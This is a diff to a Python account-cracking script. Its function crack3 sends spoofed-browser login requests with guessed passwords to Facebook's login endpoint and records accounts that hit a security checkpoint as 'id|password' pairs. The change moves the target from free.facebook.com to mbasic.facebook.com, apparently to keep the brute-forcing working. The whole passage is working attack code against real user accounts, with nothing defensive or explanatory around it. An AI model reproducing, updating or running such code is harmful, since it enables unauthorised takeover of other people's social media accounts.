@@ -710,7 +710,7 @@ def crack3(idf,pwv):
 			ses.headers.update({'Host': 'free.facebook.com',
 'cache-control': 'max-age=0',
 'upgrade-insecure-requests': '1',
-'origin': 'https://free.facebook.com',
+'origin': 'https://mbasic.facebook.com',
 'content-type': 'application/x-www-form-urlencoded',
 'user-agent': ua,
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -718,11 +718,11 @@ def crack3(idf,pwv):
 'sec-fetch-mode': 'cors',
 'sec-fetch-user': 'empty',
 'sec-fetch-dest': 'document',
-'referer': 'https://free.facebook.com/login/?email='+idf,
+'referer': 'https://mbasic.facebook.com/login/?email='+idf,
 'accept-encoding':'gzip, deflate br',
 'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
 
-			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
